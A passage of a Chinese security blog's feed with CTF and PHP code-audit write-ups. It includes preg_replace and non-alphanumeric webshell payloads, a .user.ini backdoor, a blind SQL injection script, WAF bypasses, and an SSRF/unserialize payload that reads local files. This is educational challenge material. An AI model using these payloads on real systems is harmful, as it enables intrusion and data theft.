&#39;w&#39;);</span><br><span class="line">        $content &#x3D; &#39;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#39;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">        $msg &#x3D; &#39;Flag is here,come on~ &#39; . $savepath . htmlspecialchars($_GET[&#39;filename&#39;]) . &quot;&quot;;</span><br><span class="line">        echo $msg;</span><br><span class="line">        usleep(100000);</span><br><span class="line">        $content &#x3D; &quot;Too slow!&quot;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">    &#125;</span><br><span class="line">   print &lt;&lt;&lt;EOT</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;exampleInputEmail1&quot;&gt;Filename&lt;&#x2F;label&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; name&#x3D;&quot;filename&quot; id&#x3D;&quot;exampleInputEmail1&quot; placeholder&#x3D;&quot;Filename&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">&lt;label for&#x3D;&quot;exampleInputPassword1&quot;&gt;Content&lt;&#x2F;label&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; name&#x3D;&quot;content&quot; id&#x3D;&quot;exampleInputPassword1&quot; placeholder&#x3D;&quot;Contont&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-default&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">EOT;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#39;you can not see this page&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在index.php中可以通过parse_str进行变量覆盖：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/40.png" class title="Da4er"><p>在uploadsoming.php中主要使用的竞争原理，关键函数<strong>usleep(100000)</strong><br>关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((@$_GET[<span class="string">'filename'</span>]) &amp;&amp; (@$_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">       <span class="comment">//$fp = fopen("$savepath".$_GET['filename'], 'w');</span></span><br><span class="line">       $content = <span class="string">'HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r'</span>;</span><br><span class="line">       file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">       $msg = <span class="string">'Flag is here,come on~ '</span> . $savepath . htmlspecialchars($_GET[<span class="string">'filename'</span>]) . <span class="string">""</span>;</span><br></pre></td></tr></table></figure><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/46.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/41.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/42.png" class title="Da4er"><hr><h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace与代码执行"><a href="#preg-replace与代码执行" class="headerlink" title="preg_replace与代码执行"></a>preg_replace与代码执行</h3><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/47.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/48.png" class title="Da4er"><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/49.png" class title="Da4er"><p>测试代码如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/50.png" class title="Da4er"><p>上面那段代码的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>这里主要利用了三个知识点：<strong>preg_replace()函数/e模式导致的代码执行，正则中(\1)表示捕获第一个匹配的字符串，双引号导致的变量解</strong> <strong>析(可变变量)</strong><br>参考博客：<br><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><h3 id="CTF-Docker-题目-4"><a href="#CTF-Docker-题目-4" class="headerlink" title="CTF Docker 题目"></a>CTF Docker 题目</h3><p>有两道CTF题目，代码如下：<br>一</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/51.png" class title="Da4er"><p>这道题主要利用了无字母或数字的webshell，参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list" %3ehttps: www.leavesongs.com penetration webshell-without-alphanum.html?page="2#reply-list"">p神博客</a><br>fuzz脚本如下：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/52.png" class title="Da4er"><p>将这些数字对应的ascii找出来，在url编码一下，得到payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;</span><br><span class="line">等效于：</span><br><span class="line">$_&#x3D;getFlag;</span><br></pre></td></tr></table></figure><p>最后利用：</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/53.png" class title="Da4er"><hr><p>二</p><img src="/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/54.png" class title="Da4er"><p>相比于第一个，过滤了下划线。可以使用中文字符代替，或者测试一些那些字符可以当作变量名fuzz脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    asc &#x3D; &quot;%%%02x&quot; % i</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP&#x2F;ceshi&#x2F;webshell&#x2F;index.php?code&#x3D;$%s&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%%1c%%1e%%0f%%3d%%17%%1a%%1c&quot;;$%s();&#39; % (asc,asc)</span><br><span class="line">    r &#x3D; requests.get(url)</span><br><span class="line">    if &#39;flag&#39; in r.text:</span><br><span class="line">        print(&quot;%s 可用&quot; % asc)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$呵&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$呵&#125;[呵]($&#123;$呵&#125;[呵]);&amp;呵&#x3D;getFlag</span><br><span class="line">$%7F&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1C%1E%0F%3d%17%1A%1C&quot;;$%7F();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h2 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h2&gt;&lt;h4 id=&quot;in-array-函数漏洞&quot;&gt;&lt;a href=&quot;#in-array-函数漏洞&quot; class=&quot;headerlink&quot; title=&quot;in_array()函数漏洞&quot;&gt;&lt;/a&gt;in_array()函数漏洞&lt;/h4&gt;&lt;img src=&quot;/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP留言板开发</title>
    <link href="https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html"/>
    <id>https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html</id>
    <published>2020-03-03T12:59:59.000Z</published>
    <updated>2020-03-03T13:12:21.440Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。</p><a id="more"></a><hr><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>首先设计前端页面，前端页面主要使用的boostraps框架(因为这个框架简单好用23333…)。自己也不会前端，所以用到什么就去Boostrap官网现找。<br>其次是设计数据库，数据库的话需要三张表：user表，comment表，admin表。<br>设计代码如下：<br>comment：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table comment(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    comment varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8 comment &quot;评论表&quot;</span><br></pre></td></tr></table></figure><hr><p>user表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create table user(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null ,</span><br><span class="line">    password varchar(255) not null ,</span><br><span class="line">    email varchar(255) not null,</span><br><span class="line">    comment varchar(255) not nul ,</span><br><span class="line">    join_date date not null ,</span><br><span class="line">    primary key(id),</span><br><span class="line">    unique key(username),</span><br><span class="line">    unique key(password)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure><hr><p>admin表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table admin(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null,</span><br><span class="line">    password varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8</span><br><span class="line"></span><br><span class="line">insert into admin(username,password) values (&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;);</span><br></pre></td></tr></table></figure><hr><h3 id="功能点分析"><a href="#功能点分析" class="headerlink" title="功能点分析"></a>功能点分析</h3><p>在设计后台代码的时候，首先是分析功能点，这个很重要。<strong>因为大网站都是靠一个个小的功能点堆积起来的。</strong><br>这个留言板主要的功能为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户注册</span><br><span class="line">用户登录</span><br><span class="line">密码找回</span><br><span class="line">个人信息设置(信息更新 头像上传)</span><br><span class="line">留言发布</span><br><span class="line">留言展示</span><br><span class="line">前台留言分页展示</span><br><span class="line">搜索界面</span><br><span class="line">管理员后台登录</span><br><span class="line">后台用户管理</span><br><span class="line">后台留言管理</span><br></pre></td></tr></table></figure><p>所以在写的时候，要一个功能一个功能的去实现。</p><hr><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>代码就不展示了，太多了23333….. 最后放几张效果图吧</p><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/1.png" class title="Da4er"><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/2.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF Web持续更新</title>
    <link href="https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-03T02:47:54.000Z</published>
    <updated>2020-04-08T07:54:08.518Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>知识点：PHP字符串的解析漏洞。</strong></p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：</p></blockquote><a id="more"></a><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><p>当我们传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20%20da4[er%00&#x3D;42&quot;+AND+1&#x3D;0–</span><br></pre></td></tr></table></figure><p>PHP在解析的时候会自动将不合法的字符转换，转换规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><p>所以上面的参数最后会变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">da4_er&#x3D;42&quot; AND 1&#x3D;0–</span><br></pre></td></tr></table></figure><p>从而绕过一些waf的检测。<br><strong>解题：</strong><br>查看网页源代码发现题目存在waf，同时发现calc.php的后台处理程序。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><p>访问calc.php:</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>当我们传入非int型的参数后，会被waf拦截：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><p>但是可以传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格num</span><br></pre></td></tr></table></figure><p>绕过waf检测。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>绕过之后就是简单的代码执行，但是过滤了一些特殊字符，可以使用chr()函数绕过。<br>首先通过scandir扫描根目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>最后通过file_get_contents函数读取文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><hr><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p><strong>知识点：.user.ini创建隐藏后门。</strong></p><blockquote><p>.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini。</p></blockquote><p>利用方法：.user.ini可以自定义php.ini，所以我们可以设置两个参<strong>auto_prepend_file和auto_append_file</strong><br>这两个参数的意思是：如果在上传的.user.ini目录下，有一个可执行的php文件，那么设置这两个参数后可以自动包含其他的php代码文件，如同：<strong>require和include作用一样。</strong></p><p>唯一不一样的是：auto_prepend_file在文件前插入，auto_append_file在文件后插入。<br>所以我们在.user.ini文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;da4er.jpg</span><br></pre></td></tr></table></figure><p>那么在该目录下的可执行php文件中，会自动包含：<strong>require(“./da4er.jpg”);</strong></p><p><strong>解题：</strong><br>首先上传一个小马图片，这个题目作了三个限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不能上传ph或php结尾的，</span><br><span class="line">存在文件头过滤，需要添加图片文件的文件头</span><br><span class="line">文件的内容不能包含&lt;?，但可以上传&lt;script language&#x3D;&#39;php&#39;&gt;&lt;scirpt&gt;类型的图片马来绕过。</span><br></pre></td></tr></table></figure><p>上传后发现目录下还存在一个index.php，这就给利用.user.ini提供了条件</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>所以直接上传.user.ini文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;script.jpg</span><br></pre></td></tr></table></figure><p>便可得到flag。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><hr><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p><strong>知识点：布尔盲注，绕过过滤空格的sql注入。</strong><br>绕过空格：<br>可以使用一些url编码的特殊字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or &#39;1&#39;&#x3D;&#39;1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</span><br></pre></td></tr></table></figure><p>使用括号()</p><hr><p>布尔盲注：正确和错误返回不一样。</p><hr><p><strong>解题：</strong><br>首先拿到题目，简单测试一下发现有过滤，看到id知道是数字型的注入。<br>先fuzz一下：<br>发现过滤了空格，and，or，/**/等关键字，但是ascii和substr没有被过滤，想到布尔盲注。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><p>在测试一下，这题是否可以使用布尔盲注，发现正确和错误返回不一样，所以就可以写脚本了。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;c2f8d78b-be94-4e32-9389-c13225236eb1.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">x &#x3D; string.printable</span><br><span class="line"># print(x)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    for j in x:</span><br><span class="line">        data[&quot;id&quot;] &#x3D; &quot;1&#x3D;(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%s)&#x3D;1&quot;%(i,ord(j))</span><br><span class="line">        resp &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">        if &quot;Hello&quot; in resp.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p><strong>知识点</strong>：SSRF漏洞利用，PHP反序列化，SQL注入<br>在php代码中使用curl_exec函数访问内网服务器资源的时候，会造成ssrf漏洞。<br>PHP反序列化，调用魔法函数。</p><hr><p><strong>解题：</strong><br>扫描目录发现有个备份文件：<br>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();                                   &#x2F;&#x2F;初始化一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);                 &#x2F;&#x2F;设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         &#x2F;&#x2F;设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output &#x3D; curl_exec($ch);                            &#x2F;&#x2F;运行cURL，请求网页</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);          &#x2F;&#x2F;关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现get函数会造成ssrf漏洞，接着去测试发现在view.php页面存在sql注入。<br>而且union select在一起会被过滤，可以使用/**/进行绕过。<br>所以可以直接构造反序列化，获取flag.php文件。<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>得到flag：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="Da4er"><hr><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>打开网页查看源代码，可以查看到格式化之后的代码。源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 